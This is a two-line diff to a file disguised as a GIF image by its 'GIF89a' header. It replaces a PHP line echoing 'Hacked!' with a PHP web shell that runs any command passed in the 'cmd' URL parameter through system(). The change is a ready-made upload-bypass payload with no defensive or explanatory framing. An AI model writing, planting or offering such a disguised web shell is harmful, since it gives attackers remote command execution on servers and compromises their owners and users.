@@ -1,2 +1,2 @@
 GIF89a;
-<?php echo "Hacked!"; ?>
+<?php system($_GET[‘cmd’]); ?>
